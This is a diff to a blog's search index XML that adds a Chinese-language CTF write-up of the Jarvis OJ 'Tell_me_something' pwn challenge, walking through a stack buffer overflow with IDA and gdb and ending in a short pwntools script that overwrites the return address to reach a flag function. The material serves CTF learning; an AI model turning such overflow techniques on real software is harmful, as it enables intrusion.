@@ -3,6 +3,33 @@
   
     
     <entry>
+      <title>Pwn-10月20-one-of-jarvis</title>
+      <link href="/2018/10/20/Pwn-10%E6%9C%8820-two-of-jarvis/"/>
+      <url>/2018/10/20/Pwn-10%E6%9C%8820-two-of-jarvis/</url>
+      
+        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10月20-jarvis-Tell-me-something"><a href="#Pwn-10月20-jarvis-Tell-me-something" class="headerlink" title="Pwn-10月20-jarvis-Tell_me_something"></a>Pwn-10月20-jarvis-Tell_me_something</h1><blockquote><p>今天简单地做一下jarvis oj的两道题，<code>level0</code>和<code>Tell_me_something</code>.</p><p>PS:凌晨0:07  明天写level0，其实两题差不多的逻辑，挺简单的。</p></blockquote><h2 id="Tell-me-something"><a href="#Tell-me-something" class="headerlink" title="Tell_me_something"></a>Tell_me_something</h2><h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote><p>首先，<code>file gestbook</code>and<code>checksec guestbook</code>，简单地看看文件信息和保护措施</p><p><img src="https://i.loli.net/2018/10/20/5bcb420ce98b7.png" alt=""></p><p>可以看到它是没有脱衣服的，然后没有开启保护措施。</p></blockquote><h3 id="静态分析程序逻辑"><a href="#静态分析程序逻辑" class="headerlink" title="静态分析程序逻辑"></a>静态分析程序逻辑</h3><blockquote><p>用IDA pro 看一下该程序的汇编代码，可以看到main函数：</p><p><img src="https://i.loli.net/2018/10/20/5bcb42684db9f.png" alt=""></p><p>F5大法，看看伪代码，很简单就可以判断出溢出点，因为read函数可以将超出0x88大小的数据读入栈空间：</p><p><img src="https://i.loli.net/2018/10/20/5bcb42f7dd043.png" alt=""></p><p>然后我们也可以看到good_game函数里面有我们要的关键信息：</p><p><img src="https://i.loli.net/2018/10/20/5bcb498c0b0c9.png" alt=""></p><p>那么到这里基本上可以确定，是通过溢出来使程序跳转到good_game函数从而得到flag。</p></blockquote><h3 id="动态分析程序逻辑"><a href="#动态分析程序逻辑" class="headerlink" title="动态分析程序逻辑"></a>动态分析程序逻辑</h3><blockquote><p>首先放linux里面跑一跑：</p><p><img src="https://i.loli.net/2018/10/20/5bcb48a91dfc9.png" alt=""></p><p>确实产生了溢出的问题，然后这里我们用一下linux平台的一个二进制分析软件，radare2，说实话还是可以用的，这个软件集成了很多工具，并且也可以进行部分地动态调试（<a href="https://xz.aliyun.com/t/1514/#toc-7" target="_blank" rel="noopener">radare2详细教程</a>）：</p><p><img src="https://i.loli.net/2018/10/20/5bcb495987b21.png" alt=""></p><p>接下来我们用gdb调试一下，先构造一个0x88长度的padding输入，再看看栈空间：</p><p><img src="https://i.loli.net/2018/10/20/5bcb4c838d5dd.png" alt=""></p><p>可以知道将长度为0x88的padding填充到栈空间之后，还可以进行覆盖，因为可以读取最大0x100（256）大小的字符，而ebp栈底出界就是一个函数地址，我们可以看看这个函数地址有什么关键性的操作举动：</p><p><img src="https://i.loli.net/2018/10/20/5bcb4d6959622.png" alt=""></p><p>进行单步执行测试查看该溢出点能够被覆盖的地址是否会被返回，先重新查看一下该栈位置存储的函数地址为多少：</p><p><img src="https://i.loli.net/2018/10/20/5bcb4f4e7f83a.png" alt=""></p><p>可以看到存储的函数地址为0x7ffff7a3fa87，到栈位置即将改变时，进行下一步验证：</p><p><img src="https://i.loli.net/2018/10/20/5bcb4e0d8a46d.png" alt=""></p><p>执行下一步：</p><p><img src="https://i.loli.net/2018/10/20/5bcb4e84bc436.png" alt=""></p><p>再下一步就将该函数地址放入了RIP，作为下一步运行的函数指令：<br><img src="https://i.loli.net/2018/10/20/5bcb4ed83e345.png" alt=""></p><p>那么到这里已经明白可以返回该地址覆盖的内容，写exp了。</p></blockquote><h3 id="攻破"><a href="#攻破" class="headerlink" title="攻破"></a>攻破</h3><blockquote><p>用0x88长度的内容做padding，然后将good_game的地址放到尾部，然后执行即可。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token comment" spellcheck="true">#exp.py</span>Author <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn impor <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'guestbook'</span><span class="token punctuation">)</span>good_game_addr <span class="token operator">=</span> <span class="token number">0x400620</span>padding <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x88</span>payload <span class="token operator">=</span> padding <span class="token operator">+</span> p64<span class="token punctuation">(</span>good_game_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>运行结果：</p><p><img src="https://i.loli.net/2018/10/21/5bcb5203a355b.png" alt=""></p><p>啊本来今天打算写两题的博客，看来这篇只能水了，太晚了先睡了。😭😭</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Pwn </tag>
+            
+            <tag> CTF </tag>
+            
+            <tag> 二进制安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>Pwn-10月17-strip</title>
       <link href="/2018/10/17/Pwn-10%E6%9C%8817-strip/"/>
       <url>/2018/10/17/Pwn-10%E6%9C%8817-strip/</url>
